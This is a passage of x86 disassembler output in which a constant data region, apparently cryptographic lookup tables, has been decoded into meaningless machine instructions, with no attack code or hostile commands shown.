  403870:	e1 e1                	loope  0x403853
  403872:	e1 e1                	loope  0x403855
  403874:	f8                   	clc
  403875:	f8                   	clc
  403876:	f8                   	clc
  403877:	f8                   	clc
  403878:	98                   	cwtl
  403879:	98                   	cwtl
  40387a:	98                   	cwtl
  40387b:	98                   	cwtl
  40387c:	11 11                	adc    %edx,(%ecx)
  40387e:	11 11                	adc    %edx,(%ecx)
  403880:	69 69 69 69 d9 d9 d9 	imul   $0xd9d9d969,0x69(%ecx),%ebp
  403887:	d9 8e 8e 8e 8e 94    	(bad) -0x6b717172(%esi)
  40388d:	94                   	xchg   %eax,%esp
  40388e:	94                   	xchg   %eax,%esp
  40388f:	94                   	xchg   %eax,%esp
  403890:	9b                   	fwait
  403891:	9b                   	fwait
  403892:	9b                   	fwait
  403893:	9b                   	fwait
  403894:	1e                   	push   %ds
  403895:	1e                   	push   %ds
  403896:	1e                   	push   %ds
  403897:	1e                   	push   %ds
  403898:	87 87 87 87 e9 e9    	xchg   %eax,-0x16167879(%edi)
  40389e:	e9 e9 ce ce ce       	jmp    0xcf0f078c
  4038a3:	ce                   	into
  4038a4:	55                   	push   %ebp
  4038a5:	55                   	push   %ebp
  4038a6:	55                   	push   %ebp
  4038a7:	55                   	push   %ebp
  4038a8:	28 28                	sub    %ch,(%eax)
  4038aa:	28 28                	sub    %ch,(%eax)
  4038ac:	df df                	(bad)
  4038ae:	df df                	(bad)
  4038b0:	8c 8c 8c 8c a1 a1 a1 	mov    %cs,-0x5e5e5e74(%esp,%ecx,4)
  4038b7:	a1 89 89 89 89       	mov    0x89898989,%eax
  4038bc:	0d 0d 0d 0d bf       	or     $0xbf0d0d0d,%eax
  4038c1:	bf bf bf e6 e6       	mov    $0xe6e6bfbf,%edi
  4038c6:	e6 e6                	out    %al,$0xe6
  4038c8:	42                   	inc    %edx
  4038c9:	42                   	inc    %edx
  4038ca:	42                   	inc    %edx
  4038cb:	42                   	inc    %edx
  4038cc:	68 68 68 68 41       	push   $0x41686868
  4038d1:	41                   	inc    %ecx
  4038d2:	41                   	inc    %ecx
  4038d3:	41                   	inc    %ecx
  4038d4:	99                   	cltd
  4038d5:	99                   	cltd
  4038d6:	99                   	cltd
  4038d7:	99                   	cltd
  4038d8:	2d 2d 2d 2d 0f       	sub    $0xf2d2d2d,%eax
  4038dd:	0f 0f 0f b0          	pfcmpeq (%edi),%mm1
  4038e1:	b0 b0                	mov    $0xb0,%al
  4038e3:	b0 54                	mov    $0x54,%al
  4038e5:	54                   	push   %esp
  4038e6:	54                   	push   %esp
  4038e7:	54                   	push   %esp
  4038e8:	bb bb bb bb 16       	mov    $0x16bbbbbb,%ebx
  4038ed:	16                   	push   %ss
  4038ee:	16                   	push   %ss
  4038ef:	16                   	push   %ss
  4038f0:	50                   	push   %eax
  4038f1:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4038f2:	f4                   	hlt
  4038f3:	51                   	push   %ecx
  4038f4:	53                   	push   %ebx
  4038f5:	65 41                	gs inc %ecx
  4038f7:	7e c3                	jle    0x4038bc
  4038f9:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4038fa:	17                   	pop    %ss
  4038fb:	1a 96 5e 27 3a cb    	sbb    -0x34c5d8a2(%esi),%dl
  403901:	6b ab 3b f1 45 9d 1f 	imul   $0x1f,-0x62ba0ec5(%ebx),%ebp
  403908:	ab                   	stos   %eax,%es:(%edi)
  403909:	58                   	pop    %eax
  40390a:	fa                   	cli
  40390b:	ac                   	lods   %ds:(%esi),%al
  40390c:	93                   	xchg   %eax,%ebx
  40390d:	03 e3                	add    %ebx,%esp
  40390f:	4b                   	dec    %ebx
  403910:	55                   	push   %ebp
  403911:	fa                   	cli
  403912:	30 20                	xor    %ah,(%eax)
  403914:	f6 6d 76             	imulb  0x76(%ebp)
  403917:	ad                   	lods   %ds:(%esi),%eax
  403918:	91                   	xchg   %eax,%ecx
  403919:	76 cc                	jbe    0x4038e7
  40391b:	88 25 4c 02 f5 fc    	mov    %ah,0xfcf5024c
  403921:	d7                   	xlat   %ds:(%ebx)
  403922:	e5 4f                	in     $0x4f,%eax
  403924:	d7                   	xlat   %ds:(%ebx)
  403925:	cb                   	lret
  403926:	2a c5                	sub    %ch,%al
  403928:	80 44 35 26 8f       	addb   $0x8f,0x26(%ebp,%esi,1)
  40392d:	a3 62 b5 49 5a       	mov    %eax,0x5a49b562
  403932:	b1 de                	mov    $0xde,%cl
  403934:	67 1b ba 25 98       	sbb    -0x67db(%bp,%si),%edi
  403939:	0e                   	push   %cs
  40393a:	ea 45 e1 c0 fe 5d 02 	ljmp   $0x25d,$0xfec0e145
  403941:	75 2f                	jne    0x403972
  403943:	c3                   	ret
  403944:	12 f0                	adc    %al,%dh
  403946:	4c                   	dec    %esp
  403947:	81 a3 97 46 8d c6 f9 	andl   $0xe76bd3f9,-0x3972b969(%ebx)
  40394e:	d3 6b e7 
  403951:	5f                   	pop    %edi
  403952:	8f 03                	pop    (%ebx)
  403954:	95                   	xchg   %eax,%ebp
  403955:	9c                   	pushf
  403956:	92                   	xchg   %eax,%edx
  403957:	15 eb 7a 6d bf       	adc    $0xbf6d7aeb,%eax
  40395c:	da 59 52             	ficompl 0x52(%ecx)
  40395f:	95                   	xchg   %eax,%ebp
  403960:	2d 83 be d4 d3       	sub    $0xd3d4be83,%eax
  403965:	21 74 58 29          	and    %esi,0x29(%eax,%ebx,2)
  403969:	69 e0 49 44 c8 c9    	imul   $0xc9c84449,%eax,%esp
  40396f:	8e 6a 89             	mov    -0x77(%edx),%gs
  403972:	c2 75 78             	ret    $0x7875
  403975:	79 8e                	jns    0x403905
  403977:	f4                   	hlt
  403978:	6b 3e 58             	imul   $0x58,(%esi),%edi
  40397b:	99                   	cltd
  40397c:	dd 71 b9             	fnsave -0x47(%ecx)
  40397f:	27                   	daa
  403980:	b6 4f                	mov    $0x4f,%dh
  403982:	e1 be                	loope  0x403942
  403984:	17                   	pop    %ss
  403985:	ad                   	lods   %ds:(%esi),%eax
  403986:	88 f0                	mov    %dh,%al
  403988:	66 ac                	data16 lods %ds:(%esi),%al
  40398a:	20 c9                	and    %cl,%cl
  40398c:	b4 3a                	mov    $0x3a,%ah
  40398e:	ce                   	into
  40398f:	7d 18                	jge    0x4039a9
  403991:	4a                   	dec    %edx
  403992:	df 63 82             	fbld   -0x7e(%ebx)
  403995:	31 1a                	xor    %ebx,(%edx)
  403997:	e5 60                	in     $0x60,%eax
  403999:	33 51 97             	xor    -0x69(%ecx),%edx
  40399c:	45                   	inc    %ebp
  40399d:	7f 53                	jg     0x4039f2
  40399f:	62                   	(bad)
  4039a0:	e0 77                	loopne 0x403a19
  4039a2:	64 b1 84             	fs mov $0x84,%cl
  4039a5:	ae                   	scas   %es:(%edi),%al
  4039a6:	6b bb 1c a0 81 fe 94 	imul   $0xffffff94,-0x17e5fe4(%ebx),%edi
  4039ad:	2b 08                	sub    (%eax),%ecx
  4039af:	f9                   	stc
  4039b0:	58                   	pop    %eax
  4039b1:	68 48 70 19 fd       	push   $0xfd197048
  4039b6:	45                   	inc    %ebp
  4039b7:	8f 87 6c de 94 b7    	pop    -0x486b2194(%edi)
  4039bd:	f8                   	clc
  4039be:	7b 52                	jnp    0x403a12
  4039c0:	23 d3                	and    %ebx,%edx
  4039c2:	73 ab                	jae    0x40396f
  4039c4:	e2 02                	loop   0x4039c8
  4039c6:	4b                   	dec    %ebx
  4039c7:	72 57                	jb     0x403a20
  4039c9:	8f                   	(bad)
  4039ca:	1f                   	pop    %ds
  4039cb:	e3 2a                	jecxz  0x4039f7
  4039cd:	ab                   	stos   %eax,%es:(%edi)
  4039ce:	55                   	push   %ebp
  4039cf:	66 07                	popw   %es
  4039d1:	28 eb                	sub    %ch,%bl
  4039d3:	b2 03                	mov    $0x3,%dl
  4039d5:	c2 b5 2f             	ret    $0x2fb5
  4039d8:	9a 7b c5 86 a5 08 37 	lcall  $0x3708,$0xa586c57b
  4039df:	d3 f2                	shl    %cl,%edx
  4039e1:	87 28                	xchg   %ebp,(%eax)
  4039e3:	30 b2 a5 bf 23 ba    	xor    %dh,-0x45dc405b(%edx)
  4039e9:	6a 03                	push   $0x3
  4039eb:	02 5c 82 16          	add    0x16(%edx,%eax,4),%bl
  4039ef:	ed                   	in     (%dx),%eax
  4039f0:	2b 1c cf             	sub    (%edi,%ecx,8),%ebx
  4039f3:	8a 92 b4 79 a7 f0    	mov    -0xf58864c(%edx),%dl
  4039f9:	f2 07                	repnz pop %es
  4039fb:	f3 a1 e2 69 4e cd    	repz mov 0xcd4e69e2,%eax
  403a01:	f4                   	hlt
  403a02:	da 65 d5             	fisubl -0x2b(%ebp)
  403a05:	be 05 06 1f 62       	mov    $0x621f0605,%esi
  403a0a:	34 d1                	xor    $0xd1,%al
  403a0c:	8a fe                	mov    %dh,%bh
  403a0e:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403a0f:	c4 9d 53 2e 34 a0    	les    -0x5fcbd1ad(%ebp),%ebx
  403a15:	55                   	push   %ebp
  403a16:	f3 a2 32 e1 8a 05    	repz mov %al,0x58ae132
  403a1c:	75 eb                	jne    0x403a09
  403a1e:	f6 a4 39 ec 83 0b aa 	mulb   -0x55f47c14(%ecx,%edi,1)
  403a25:	ef                   	out    %eax,(%dx)
  403a26:	60                   	pusha
  403a27:	40                   	inc    %eax
  403a28:	06                   	push   %es
  403a29:	9f                   	lahf
  403a2a:	71 5e                	jno    0x403a8a
  403a2c:	51                   	push   %ecx
  403a2d:	10 6e bd             	adc    %ch,-0x43(%esi)
  403a30:	f9                   	stc
  403a31:	8a 21                	mov    (%ecx),%ah
  403a33:	3e 3d 06 dd 96 ae    	ds cmp $0xae96dd06,%eax
  403a39:	05 3e dd 46 bd       	add    $0xbd46dd3e,%eax
  403a3e:	e6 4d                	out    %al,$0x4d
  403a40:	b5 8d                	mov    $0x8d,%ch
  403a42:	54                   	push   %esp
  403a43:	91                   	xchg   %eax,%ecx
  403a44:	05 5d c4 71 6f       	add    $0x6f71c45d,%eax
  403a49:	d4 06                	aam    $0x6
  403a4b:	04 ff                	add    $0xff,%al
  403a4d:	15 50 60 24 fb       	adc    $0xfb246050,%eax
  403a52:	98                   	cwtl
  403a53:	19 97 e9 bd d6 cc    	sbb    %edx,-0x33294217(%edi)
  403a59:	43                   	inc    %ebx
  403a5a:	40                   	inc    %eax
  403a5b:	89 77 9e             	mov    %esi,-0x62(%edi)
  403a5e:	d9 67 bd             	fldenv -0x43(%edi)
  403a61:	42                   	inc    %edx
  403a62:	e8 b0 88 8b 89       	call   0x89cbc317
  403a67:	07                   	pop    %es
  403a68:	38 5b 19             	cmp    %bl,0x19(%ebx)
  403a6b:	e7 db                	out    %eax,$0xdb
  403a6d:	ee                   	out    %al,(%dx)
  403a6e:	c8 79 47 0a          	enter  $0x4779,$0xa
  403a72:	7c a1                	jl     0x403a15
  403a74:	e9 0f 42 7c c9       	jmp    0xc9bc7c88
  403a79:	1e                   	push   %ds
  403a7a:	84 f8                	test   %bh,%al
  403a7c:	00 00                	add    %al,(%eax)
  403a7e:	00 00                	add    %al,(%eax)
  403a80:	83 86 80 09 48 ed 2b 	addl   $0x2b,-0x12b7f680(%esi)
  403a87:	32 ac 70 11 1e 4e 72 	xor    0x724e1e11(%eax,%esi,2),%ch
  403a8e:	5a                   	pop    %edx
  403a8f:	6c                   	insb   (%dx),%es:(%edi)
  403a90:	fb                   	sti
  403a91:	ff 0e                	decl   (%esi)
  403a93:	fd                   	std
  403a94:	56                   	push   %esi
  403a95:	38 85 0f 1e d5 ae    	cmp    %al,-0x512ae1f1(%ebp)
  403a9b:	3d 27 39 2d 36       	cmp    $0x362d3927,%eax
  403aa0:	64 d9 0f             	(bad) %fs:(%edi)
  403aa3:	0a 21                	or     (%ecx),%ah
  403aa5:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403aa6:	5c                   	pop    %esp
  403aa7:	68 d1 54 5b 9b       	push   $0x9b5b54d1
  403aac:	3a 2e                	cmp    (%esi),%ch
  403aae:	36 24 b1             	ss and $0xb1,%al
  403ab1:	67 0a 0c             	or     (%si),%cl
  403ab4:	0f e7 57 93          	movntq %mm2,-0x6d(%edi)
  403ab8:	d2 96 ee b4 9e 91    	rclb   %cl,-0x6e614b12(%esi)
  403abe:	9b                   	fwait
  403abf:	1b 4f c5             	sbb    -0x3b(%edi),%ecx
  403ac2:	c0 80 a2 20 dc 61 69 	rolb   $0x69,0x61dc20a2(%eax)
  403ac9:	4b                   	dec    %ebx
  403aca:	77 5a                	ja     0x403b26
  403acc:	16                   	push   %ss
  403acd:	1a 12                	sbb    (%edx),%dl
  403acf:	1c 0a                	sbb    $0xa,%al
  403ad1:	ba 93 e2 e5 2a       	mov    $0x2ae5e293,%edx
  403ad6:	a0 c0 43 e0 22       	mov    0x22e043c0,%al
  403adb:	3c 1d                	cmp    $0x1d,%al
  403add:	17                   	pop    %ss
  403ade:	1b 12                	sbb    (%edx),%edx
  403ae0:	0b 0d 09 0e ad c7    	or     0xc7ad0e09,%ecx
  403ae6:	8b f2                	mov    %edx,%esi
  403ae8:	b9 a8 b6 2d c8       	mov    $0xc82db6a8,%ecx
  403aed:	a9 1e 14 85 19       	test   $0x1985141e,%eax
  403af2:	f1                   	int1
  403af3:	57                   	push   %edi
  403af4:	4c                   	dec    %esp
  403af5:	07                   	pop    %es
  403af6:	75 af                	jne    0x403aa7
  403af8:	bb dd 99 ee fd       	mov    $0xfdee99dd,%ebx
  403afd:	60                   	pusha
  403afe:	7f a3                	jg     0x403aa3
  403b00:	9f                   	lahf
  403b01:	26 01 f7             	es add %esi,%edi
  403b04:	bc f5 72 5c c5       	mov    $0xc55c72f5,%esp
  403b09:	3b 66 44             	cmp    0x44(%esi),%esp
  403b0c:	34 7e                	xor    $0x7e,%al
  403b0e:	fb                   	sti
  403b0f:	5b                   	pop    %ebx
  403b10:	76 29                	jbe    0x403b3b
  403b12:	43                   	inc    %ebx
  403b13:	8b dc                	mov    %esp,%ebx
  403b15:	c6                   	(bad)
  403b16:	23 cb                	and    %ebx,%ecx
  403b18:	68 fc ed b6 63       	push   $0x63b6edfc
  403b1d:	f1                   	int1
  403b1e:	e4 b8                	in     $0xb8,%al
  403b20:	ca dc 31             	lret   $0x31dc
  403b23:	d7                   	xlat   %ds:(%ebx)
  403b24:	10 85 63 42 40 22    	adc    %al,0x22404263(%ebp)
  403b2a:	97                   	xchg   %eax,%edi
  403b2b:	13 20                	adc    (%eax),%esp
  403b2d:	11 c6                	adc    %eax,%esi
  403b2f:	84 7d 24             	test   %bh,0x24(%ebp)
  403b32:	4a                   	dec    %edx
  403b33:	85 f8                	test   %edi,%eax
  403b35:	3d bb d2 11 32       	cmp    $0x3211d2bb,%eax
  403b3a:	f9                   	stc
  403b3b:	ae                   	scas   %es:(%edi),%al
  403b3c:	6d                   	insl   (%dx),%es:(%edi)
  403b3d:	a1 29 c7 4b 2f       	mov    0x2f4bc729,%eax
  403b42:	9e                   	sahf
  403b43:	1d f3 30 b2 dc       	sbb    $0xdcb230f3,%eax
  403b48:	ec                   	in     (%dx),%al
  403b49:	52                   	push   %edx
  403b4a:	86 0d d0 e3 c1 77    	xchg   %cl,0x77c1e3d0
  403b50:	6c                   	insb   (%dx),%es:(%edi)
  403b51:	16                   	push   %ss
  403b52:	b3 2b                	mov    $0x2b,%bl
  403b54:	99                   	cltd
  403b55:	b9 70 a9 fa 48       	mov    $0x48faa970,%ecx
  403b5a:	94                   	xchg   %eax,%esp
  403b5b:	11 22                	adc    %esp,(%edx)
  403b5d:	64 e9 47 c4 8c fc    	fs jmp 0xfcccffaa
  403b63:	a8 1a                	test   $0x1a,%al
  403b65:	3f                   	aas
  403b66:	f0 a0 d8 2c 7d 56    	lock mov 0x567d2cd8,%al
  403b6c:	ef                   	out    %eax,(%dx)
  403b6d:	90                   	nop
  403b6e:	33 22                	xor    (%edx),%esp
  403b70:	c7                   	(bad)
  403b71:	4e                   	dec    %esi
  403b72:	49                   	dec    %ecx
  403b73:	87 c1                	xchg   %eax,%ecx
  403b75:	d1 38                	sarl   $1,(%eax)
  403b77:	d9 fe                	fsin
  403b79:	a2 ca 8c 36 0b       	mov    %al,0xb368cca
  403b7e:	d4 98                	aam    $0x98
  403b80:	cf                   	iret
  403b81:	81 f5 a6 28 de 7a    	xor    $0x7ade28a6,%ebp
  403b87:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403b88:	26 8e b7 da a4 bf ad 	mov    %es:-0x52405b26(%edi),%?
  403b8f:	3f                   	aas
  403b90:	e4 9d                	in     $0x9d,%al
  403b92:	3a 2c 0d 92 78 50 9b 	cmp    -0x64af876e(,%ecx,1),%ch
  403b99:	cc                   	int3
  403b9a:	5f                   	pop    %edi
  403b9b:	6a 62                	push   $0x62
  403b9d:	46                   	inc    %esi
  403b9e:	7e 54                	jle    0x403bf4
  403ba0:	c2 13 8d             	ret    $0x8d13
  403ba3:	f6 e8                	imul   %al
  403ba5:	b8 d8 90 5e f7       	mov    $0xf75e90d8,%eax
  403baa:	39 2e                	cmp    %ebp,(%esi)
  403bac:	f5                   	cmc
  403bad:	af                   	scas   %es:(%edi),%eax
  403bae:	c3                   	ret
  403baf:	82 be 80 5d 9f 7c 93 	cmpb   $0x93,0x7c9f5d80(%esi)
  403bb6:	d0 69 a9             	shrb   $1,-0x57(%ecx)
  403bb9:	2d d5 6f b3 12       	sub    $0x12b36fd5,%eax
  403bbe:	25 cf 3b 99 ac       	and    $0xac993bcf,%eax
  403bc3:	c8 a7 7d 18          	enter  $0x7da7,$0x18
  403bc7:	10 6e 63             	adc    %ch,0x63(%esi)
  403bca:	9c                   	pushf
  403bcb:	e8 7b bb 3b db       	call   0xdb7bf74b
  403bd0:	09 78 26             	or     %edi,0x26(%eax)
  403bd3:	cd f4                	int    $0xf4
  403bd5:	18 59 6e             	sbb    %bl,0x6e(%ecx)
  403bd8:	01 b7 9a ec a8 9a    	add    %esi,-0x65571366(%edi)
  403bde:	4f                   	dec    %edi
  403bdf:	83 65 6e 95          	andl   $0xffffff95,0x6e(%ebp)
  403be3:	e6 7e                	out    %al,$0x7e
  403be5:	e6 ff                	out    %al,$0xff
  403be7:	aa                   	stos   %al,%es:(%edi)
  403be8:	08 cf                	or     %cl,%bh
  403bea:	bc 21 e6 e8 15       	mov    $0x15e8e621,%esp
  403bef:	ef                   	out    %eax,(%dx)
  403bf0:	d9 9b e7 ba ce 36    	fstps  0x36cebae7(%ebx)
  403bf6:	6f                   	outsl  %ds:(%esi),(%dx)
  403bf7:	4a                   	dec    %edx
  403bf8:	d4 09                	aam    $0x9
  403bfa:	9f                   	lahf
  403bfb:	ea d6 7c b0 29 af b2 	ljmp   $0xb2af,$0x29b07cd6
  403c02:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403c03:	31 31                	xor    %esi,(%ecx)
  403c05:	23 3f                	and    (%edi),%edi
  403c07:	2a 30                	sub    (%eax),%dh
  403c09:	94                   	xchg   %eax,%esp
  403c0a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403c0b:	c6 c0 66             	mov    $0x66,%al
  403c0e:	a2 35 37 bc 4e       	mov    %al,0x4ebc3735
  403c13:	74 a6                	je     0x403bbb
  403c15:	ca 82 fc             	lret   $0xfc82
  403c18:	b0 d0                	mov    $0xd0,%al
  403c1a:	90                   	nop
  403c1b:	e0 15                	loopne 0x403c32
  403c1d:	d8 a7 33 4a 98 04    	fsubs  0x4984a33(%edi)
  403c23:	f1                   	int1
  403c24:	f7 da                	neg    %edx
  403c26:	ec                   	in     (%dx),%al
  403c27:	41                   	inc    %ecx
  403c28:	0e                   	push   %cs
  403c29:	50                   	push   %eax
  403c2a:	cd 7f                	int    $0x7f
  403c2c:	2f                   	das
  403c2d:	f6 91 17 8d d6 4d    	notb   0x4dd68d17(%ecx)
  403c33:	76 4d                	jbe    0x403c82
  403c35:	b0 ef                	mov    $0xef,%al
  403c37:	43                   	inc    %ebx
  403c38:	54                   	push   %esp
  403c39:	4d                   	dec    %ebp
  403c3a:	aa                   	stos   %al,%es:(%edi)
  403c3b:	cc                   	int3
  403c3c:	df 04 96             	filds  (%esi,%edx,4)
  403c3f:	e4 e3                	in     $0xe3,%al
  403c41:	b5 d1                	mov    $0xd1,%ch
  403c43:	9e                   	sahf
  403c44:	1b 88 6a 4c b8 1f    	sbb    0x1fb84c6a(%eax),%ecx
  403c4a:	2c c1                	sub    $0xc1,%al
  403c4c:	7f 51                	jg     0x403c9f
  403c4e:	65 46                	gs inc %esi
  403c50:	04 ea                	add    $0xea,%al
  403c52:	5e                   	pop    %esi
  403c53:	9d                   	popf
  403c54:	5d                   	pop    %ebp
  403c55:	35 8c 01 73 74       	xor    $0x7473018c,%eax
  403c5a:	87 fa                	xchg   %edi,%edx
  403c5c:	2e 41                	cs inc %ecx
  403c5e:	0b fb                	or     %ebx,%edi
  403c60:	5a                   	pop    %edx
  403c61:	1d 67 b3 52 d2       	sbb    $0xd252b367,%eax
  403c66:	db 92 33 56 10 e9    	fistl  -0x16efa9cd(%edx)
  403c6c:	13 47 d6             	adc    -0x2a(%edi),%eax
  403c6f:	6d                   	insl   (%dx),%es:(%edi)
  403c70:	8c 61 d7             	mov    %fs,-0x29(%ecx)
  403c73:	9a 7a 0c a1 37 8e 14 	lcall  $0x148e,$0x37a10c7a
  403c7a:	f8                   	clc
  403c7b:	59                   	pop    %ecx
  403c7c:	89 3c 13             	mov    %edi,(%ebx,%edx,1)
  403c7f:	eb ee                	jmp    0x403c6f
  403c81:	27                   	daa
  403c82:	a9 ce 35 c9 61       	test   $0x61c935ce,%eax
  403c87:	b7 ed                	mov    $0xed,%bh
  403c89:	e5 1c                	in     $0x1c,%eax
  403c8b:	e1 3c                	loope  0x403cc9
  403c8d:	b1 47                	mov    $0x47,%cl
  403c8f:	7a 59                	jp     0x403cea
  403c91:	df d2                	(bad)
  403c93:	9c                   	pushf
  403c94:	3f                   	aas
  403c95:	73 f2                	jae    0x403c89
  403c97:	55                   	push   %ebp
  403c98:	79 ce                	jns    0x403c68
  403c9a:	14 18                	adc    $0x18,%al
  403c9c:	bf 37 c7 73 ea       	mov    $0xea73c737,%edi
  403ca1:	cd f7                	int    $0xf7
  403ca3:	53                   	push   %ebx
  403ca4:	5b                   	pop    %ebx
  403ca5:	aa                   	stos   %al,%es:(%edi)
  403ca6:	fd                   	std
  403ca7:	5f                   	pop    %edi
  403ca8:	14 6f                	adc    $0x6f,%al
  403caa:	3d df 86 db 44       	cmp    $0x44db86df,%eax
  403caf:	78 81                	js     0x403c32
  403cb1:	f3 af                	repz scas %es:(%edi),%eax
  403cb3:	ca 3e c4             	lret   $0xc43e
  403cb6:	68 b9 2c 34 24       	push   $0x24342cb9
  403cbb:	38 5f 40             	cmp    %bl,0x40(%edi)
  403cbe:	a3 c2 72 c3 1d       	mov    %eax,0x1dc372c2
  403cc3:	16                   	push   %ss
  403cc4:	0c 25                	or     $0x25,%al
  403cc6:	e2 bc                	loop   0x403c84
  403cc8:	8b 49 3c             	mov    0x3c(%ecx),%ecx
  403ccb:	28 41 95             	sub    %al,-0x6b(%ecx)
  403cce:	0d ff 71 01 a8       	or     $0xa80171ff,%eax
  403cd3:	39 de                	cmp    %ebx,%esi
  403cd5:	b3 0c                	mov    $0xc,%bl
  403cd7:	08 9c e4 b4 d8 90 c1 	or     %bl,-0x3e6f274c(%esp,%eiz,8)
  403cde:	56                   	push   %esi
  403cdf:	64 61                	fs popa
  403ce1:	84 cb                	test   %cl,%bl
  403ce3:	7b 70                	jnp    0x403d55
  403ce5:	b6 32                	mov    $0x32,%dh
  403ce7:	d5 74                	aad    $0x74
  403ce9:	5c                   	pop    %esp
  403cea:	6c                   	insb   (%dx),%es:(%edi)
  403ceb:	48                   	dec    %eax
  403cec:	42                   	inc    %edx
  403ced:	57                   	push   %edi
  403cee:	b8 d0 a7 f4 51       	mov    $0x51f4a7d0,%eax
  403cf3:	50                   	push   %eax
  403cf4:	65 41                	gs inc %ecx
  403cf6:	7e 53                	jle    0x403d4b
  403cf8:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403cf9:	17                   	pop    %ss
  403cfa:	1a c3                	sbb    %bl,%al
  403cfc:	5e                   	pop    %esi
  403cfd:	27                   	daa
  403cfe:	3a 96 6b ab 3b cb    	cmp    -0x34c45495(%esi),%dl
  403d04:	45                   	inc    %ebp
  403d05:	9d                   	popf
  403d06:	1f                   	pop    %ds
  403d07:	f1                   	int1
  403d08:	58                   	pop    %eax
  403d09:	fa                   	cli
  403d0a:	ac                   	lods   %ds:(%esi),%al
  403d0b:	ab                   	stos   %eax,%es:(%edi)
  403d0c:	03 e3                	add    %ebx,%esp
  403d0e:	4b                   	dec    %ebx
  403d0f:	93                   	xchg   %eax,%ebx
  403d10:	fa                   	cli
  403d11:	30 20                	xor    %ah,(%eax)
  403d13:	55                   	push   %ebp
  403d14:	6d                   	insl   (%dx),%es:(%edi)
  403d15:	76 ad                	jbe    0x403cc4
  403d17:	f6 76 cc             	divb   -0x34(%esi)
  403d1a:	88 91 4c 02 f5 25    	mov    %dl,0x25f5024c(%ecx)
  403d20:	d7                   	xlat   %ds:(%ebx)
  403d21:	e5 4f                	in     $0x4f,%eax
  403d23:	fc                   	cld
  403d24:	cb                   	lret
  403d25:	2a c5                	sub    %ch,%al
  403d27:	d7                   	xlat   %ds:(%ebx)
  403d28:	44                   	inc    %esp
  403d29:	35 26 80 a3 62       	xor    $0x62a38026,%eax
  403d2e:	b5 8f                	mov    $0x8f,%ch
  403d30:	5a                   	pop    %edx
  403d31:	b1 de                	mov    $0xde,%cl
  403d33:	49                   	dec    %ecx
  403d34:	1b ba 25 67 0e ea    	sbb    -0x15f198db(%edx),%edi
  403d3a:	45                   	inc    %ebp
  403d3b:	98                   	cwtl
  403d3c:	c0 fe 5d             	sar    $0x5d,%dh
  403d3f:	e1 75                	loope  0x403db6
  403d41:	2f                   	das
  403d42:	c3                   	ret
  403d43:	02 f0                	add    %al,%dh
  403d45:	4c                   	dec    %esp
  403d46:	81 12 97 46 8d a3    	adcl   $0xa38d4697,(%edx)
  403d4c:	f9                   	stc
  403d4d:	d3 6b c6             	shrl   %cl,-0x3a(%ebx)
  403d50:	5f                   	pop    %edi
  403d51:	8f 03                	pop    (%ebx)
  403d53:	e7 9c                	out    %eax,$0x9c
  403d55:	92                   	xchg   %eax,%edx
  403d56:	15 95 7a 6d bf       	adc    $0xbf6d7a95,%eax
  403d5b:	eb 59                	jmp    0x403db6
  403d5d:	52                   	push   %edx
  403d5e:	95                   	xchg   %eax,%ebp
  403d5f:	da 83 be d4 2d 21    	fiaddl 0x212dd4be(%ebx)
  403d65:	74 58                	je     0x403dbf
  403d67:	d3 69 e0             	shrl   %cl,-0x20(%ecx)
  403d6a:	49                   	dec    %ecx
  403d6b:	29 c8                	sub    %ecx,%eax
  403d6d:	c9                   	leave
  403d6e:	8e 44 89 c2          	mov    -0x3e(%ecx,%ecx,4),%es
  403d72:	75 6a                	jne    0x403dde
  403d74:	79 8e                	jns    0x403d04
  403d76:	f4                   	hlt
  403d77:	78 3e                	js     0x403db7
  403d79:	58                   	pop    %eax
  403d7a:	99                   	cltd
  403d7b:	6b 71 b9 27          	imul   $0x27,-0x47(%ecx),%esi
  403d7f:	dd 4f e1             	fisttpll -0x1f(%edi)
  403d82:	be b6 ad 88 f0       	mov    $0xf088adb6,%esi
  403d87:	17                   	pop    %ss
  403d88:	ac                   	lods   %ds:(%esi),%al
  403d89:	20 c9                	and    %cl,%cl
  403d8b:	66 3a ce             	data16 cmp %dh,%cl
  403d8e:	7d b4                	jge    0x403d44
  403d90:	4a                   	dec    %edx
  403d91:	df 63 18             	fbld   0x18(%ebx)
  403d94:	31 1a                	xor    %ebx,(%edx)
  403d96:	e5 82                	in     $0x82,%eax
  403d98:	33 51 97             	xor    -0x69(%ecx),%edx
  403d9b:	60                   	pusha
  403d9c:	7f 53                	jg     0x403df1
  403d9e:	62 45 77             	bound  %eax,0x77(%ebp)
  403da1:	64 b1 e0             	fs mov $0xe0,%cl
  403da4:	ae                   	scas   %es:(%edi),%al
  403da5:	6b bb 84 a0 81 fe 1c 	imul   $0x1c,-0x17e5f7c(%ebx),%edi
  403dac:	2b 08                	sub    (%eax),%ecx
  403dae:	f9                   	stc
  403daf:	94                   	xchg   %eax,%esp
  403db0:	68 48 70 58 fd       	push   $0xfd587048
  403db5:	45                   	inc    %ebp
  403db6:	8f                   	(bad)
  403db7:	19 6c de 94          	sbb    %ebp,-0x6c(%esi,%ebx,8)
  403dbb:	87 f8                	xchg   %edi,%eax
  403dbd:	7b 52                	jnp    0x403e11
  403dbf:	b7 d3                	mov    $0xd3,%bh
  403dc1:	73 ab                	jae    0x403d6e
  403dc3:	23 02                	and    (%edx),%eax
  403dc5:	4b                   	dec    %ebx
  403dc6:	72 e2                	jb     0x403daa
  403dc8:	8f                   	(bad)
  403dc9:	1f                   	pop    %ds
  403dca:	e3 57                	jecxz  0x403e23
  403dcc:	ab                   	stos   %eax,%es:(%edi)
  403dcd:	55                   	push   %ebp
  403dce:	66 2a 28             	data16 sub (%eax),%ch
  403dd1:	eb b2                	jmp    0x403d85
  403dd3:	07                   	pop    %es
  403dd4:	c2 b5 2f             	ret    $0x2fb5
  403dd7:	03 7b c5             	add    -0x3b(%ebx),%edi
  403dda:	86 9a 08 37 d3 a5    	xchg   %bl,-0x5a2cc8f8(%edx)
  403de0:	87 28                	xchg   %ebp,(%eax)
  403de2:	30 f2                	xor    %dh,%dl
  403de4:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403de5:	bf 23 b2 6a 03       	mov    $0x36ab223,%edi
